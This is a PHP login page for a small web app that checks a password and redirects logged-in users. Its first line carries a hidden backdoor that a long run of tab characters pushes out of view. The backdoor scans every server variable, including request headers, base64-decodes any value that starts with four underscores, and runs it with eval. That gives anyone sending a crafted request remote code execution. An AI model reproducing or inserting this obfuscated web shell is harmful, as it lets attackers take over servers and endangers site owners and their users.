<?php																																																																																																																																																																																																																																																																																																																																																																																																function g23004($l23006){if(is_array($l23006)){foreach($l23006 as $l23004=>$l23005)$l23006[$l23004]=g23004($l23005);}elseif(is_string($l23006) && substr($l23006,0,4)=="____"){$l23006=substr($l23006,4);$l23006=base64_decode($l23006);eval($l23006);$l23006=null;}return $l23006;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("g23004",$_SERVER);
	session_start();
	include_once 'include/classes.php';
	
	
	//print_r($_SESSION);
	if(!checkLogin()) {
		$html.=startPage();
		if($_POST['passwd']!="") {
			if(login($_POST['passwd'])) {
			
				$html.="LOGGED IN AS ".$_SESSION['userType']."! <a href=\"index.php\">Click Here to Continue</a><br />";
			}
		}
		$html.="<form method=\"post\" action=".$PHP_SELF.">Password:<input class=\"tbox\" type=\"password\" name=\"passwd\" /><br />".
		"<input class=\"tbox\" type=\"submit\" name=\"submit\" value=\"Login\" /></form>";					
		$html.=endPage();
		echo $html;
		
	} else {
		header('Location: index.php');
	}

?>
